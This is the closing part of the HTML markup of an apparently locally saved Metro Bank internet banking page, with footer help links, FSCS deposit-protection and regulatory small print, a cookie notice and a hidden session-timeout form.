										<div id="p1_GRP_06ADCD86A9EEBE2138908" style="position: relative">
											<div style="clear: both; " id="FMT_D96D931C6B0278BB569300" class="feature  ">
												<header id="FMT_D96D931C6B0278BB569364" class="">
													<div>
														<div style="clear: left;" id="row_HEAD_06ADCD86A9EEBE2138909">
															<div id="p1_HEAD_06ADCD86A9EEBE2138909" style="text-align: left; ; float: left;">
																<div>
																	<h5 id="HEAD_06ADCD86A9EEBE2138909">New Customers</h5>
																</div>
															</div>
															<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
														</div>
													</div>
												</header>
												<div>
													<div style="clear: left;" id="row_HEAD_06ADCD86A9EEBE2138961">
														<div id="p1_HEAD_06ADCD86A9EEBE2138961" style="text-align: left; ; float: left;">
															<div>
																<p>If you have not already opened an account with us, please <a href="#" target="_blank">click here</a> for information on what you need to open an account.</p>
															</div>
														</div>
														<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
													</div>
												</div>
												<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
											</div>
											<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
										</div>
									</div>
								</div>
							</div>
							<div id="COL_2F1A8E1F73CCF7BB71228" class="column grid-3" style="float: left;">
								<div>
									<div>
										<div id="p1_GRP_06ADCD86A9EEBE2138910" style="position: relative">
											<div style="clear: both; " id="FMT_D96D931C6B0278BB569343" class="feature  ">
												<header id="FMT_D96D931C6B0278BB569401" class="">
													<div>
														<div style="clear: left;" id="row_HEAD_06ADCD86A9EEBE2138911">
															<div id="p1_HEAD_06ADCD86A9EEBE2138911" style="text-align: left; ; float: left;">
																<div>
																	<h5 id="HEAD_06ADCD86A9EEBE2138911">Useful help and support</h5>
																</div>
															</div>
															<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
														</div>
													</div>
												</header>
												<div>
													<div style="clear: left;" id="row_HEAD_06ADCD86A9EEBE2138967">
														<div id="p1_HEAD_06ADCD86A9EEBE2138967" style="text-align: left; ; float: left;">
															<div>
																<p>Find <a href="##" target="_blank">useful help and support </a>on how to manage your accounts as well as more information about the Internet Banking service.</p>
															</div>
														</div>
														<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
													</div>
												</div>
												<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
											</div>
											<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
										</div>
									</div>
								</div>
							</div>
							<div id="COL_2F1A8E1F73CCF7BB71237" class="column grid-3" style="float: left;">
								<div>
									<div>
										<div id="p1_GRP_06ADCD86A9EEBE2138912" style="position: relative">
											<div style="clear: both; " id="FMT_D96D931C6B0278BB569350" class="feature  ">
												<header id="FMT_D96D931C6B0278BB569405" class="">
													<div>
														<div style="clear: left;" id="row_HEAD_06ADCD86A9EEBE2138913">
															<div id="p1_HEAD_06ADCD86A9EEBE2138913" style="text-align: left; ; float: left;">
																<div>
																	<h5 id="HEAD_06ADCD86A9EEBE2138913">We take security very seriously</h5>
																</div>
															</div>
															<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
														</div>
													</div>
												</header>
												<div>
													<div style="clear: left;" id="row_HEAD_06ADCD86A9EEBE2138973">
														<div id="p1_HEAD_06ADCD86A9EEBE2138973" style="text-align: left; ; float: left;">
															<div>
																<p>We continuously strive to make banking online safer. To find out more about security <a href="#" target="_blank">click here. </a></p>
																<div class="hr" style="padding:0px">
																	<hr style="display:none">
																</div>
															</div>
														</div>
														<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
													</div>
												</div>
												<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
											</div>
											<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
										</div>
									</div>
								</div>
							</div>
							<div id="COL_8A71F8BC2282BF181455672" class="column grid-3" style="float: left;">
								<div>
									<div>
										<div id="p1_GRP_8A71F8BC2282BF181455615" style="position: relative">
											<div style="clear: both; " id="FMT_8A71F8BC2282BF181455616" class="feature  ">
												<header id="FMT_8A71F8BC2282BF181455617" class="">
													<div>
														<div style="clear: left;" id="row_HEAD_8A71F8BC2282BF181455619">
															<div id="p1_HEAD_8A71F8BC2282BF181455619" style="text-align: left; ; float: left;">
																<div>
																	<h5 id="HEAD_8A71F8BC2282BF181455619">Service Quality Metrics</h5>
																</div>
															</div>
															<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
														</div>
													</div>
												</header>
												<div>
													<div style="clear: left;" id="row_HEAD_8A71F8BC2282BF181455620">
														<div id="p1_HEAD_8A71F8BC2282BF181455620" style="text-align: left; ; float: left;">
															<div>
																<p>Find out how Metro Bank compares to other banks in an independent service quality survey <a href="#" target="_blank">click here. </a></p>
																<div class="hr" style="padding:0px">
																	<hr style="display:none">
																</div>
															</div>
														</div>
														<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
													</div>
												</div>
												<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
											</div>
											<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
										</div>
									</div>
								</div>
							</div>
						</div>
						<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
					</div>
				</div>
				<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
			</div>
			<div style="clear: both; " id="FMT_2F1A8E1F73CCF7BB71112" class="row">
				<div style="clear: both; " id="FMT_D96D931C6B0278BB569443" class="column grid-12 small-print">
					<div style="clear: both">
						<div style="clear: left;" id="row_TXT_02B12661ED4B28FB45658">
							<div style="text-align: left; width:" id="TXT_02B12661ED4B28FB45658">
								<div>

									<p>Your eligible deposits with Metro Bank PLC are protected up to a
										total of £85,000 by the Financial Services Compensation Scheme, the UK's
										deposit guarantee scheme. Any deposits you hold above the limit are
										unlikely to be covered. For further information visit <a href="#" target="_blank"><b>www.fscs.org.uk.</b></a>.
									</p>
									<p>Metro Bank PLC. Registered in England and Wales. Company number:
										6419578. Registered office: One Southampton Row, London, WC1B 5HA. We
										are authorised by the Prudential Regulation Authority and regulated by
										the Financial Conduct Authority and Prudential Regulation Authority.
										Metro Bank PLC is an independent UK Bank - it is not affiliated with any
										other bank or organisation (including the METRO newspaper or its
										publishers) anywhere in the world.  "Metrobank" is the registered
										trademark of Metro Bank PLC.
									</p>
									<br>
									<div style="width: 100%;">
										<div style="width: 180px !important;margin: 0 10px; display: inline; float: left;">
											<em class="no-print">
												© Metro Bank

											</em>
										</div>
										<div style="margin: 0px; display: inline; float: right;">
											<a href="#" target="_blank">
												<img src="assets/FSCSLeaderBanner.jpg" alt="FSCS Leader Banner" width="210" height="38">
											</a>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
					<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
				</div>
				<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
			</div>
			<div>
				<div style="clear: left;" id="row_TXT_BAFF497FD80D683B417380">
					<div style="text-align: left; width:" id="TXT_BAFF497FD80D683B417380">
						<div>
							<div id="js-mbCookieNoticeContainer" class="displayNone">
								<div class="mbCookieNotice" id="js-mbCookieNoticeContainer">
									<div class="mbCookieNotice-img">
										<img src="assets/icon-warning.png" alt="warning-img">
									</div>
									<div class="mbCookieNotice-inner">
										<p class="mbCookieNotice-message">
											We use cookies to help provide you with the best possible online
											experience. Please read our Security and Privacy policy for information
											about which cookies we use and what information we collect on our site.
											By continuing to use this site, you agree that we may store and access
											cookies on your device. <a href="#" class="mbCookieNotice-link" target="_blank">More Info</a>
										</p>
									</div>
									<div class="mbCookieNotice-cta">
										<a class="mbCookieNotice-cta-link" onclick="createCookieAndHideSection();" href="#" id="js-mbCookieNotice-button">Close <span class="u-offscreen">cookie acceptance message</span></a>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</footer>
		<div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
	</div>
</form>

<form name="sessionTimeoutForm" method="POST" action="servletcontroller">
	<input type="hidden" name="PRODUCT" value="">
	<input type="hidden" name="PRESENTATION_TYPE" value="">
	<input type="hidden" name="MODE" value="XX">
	<input type="hidden" name="MetroBank[1].Login[1].SessionLoggedOutDueToInactivity" value="Y">
</form>

</body>
</html>
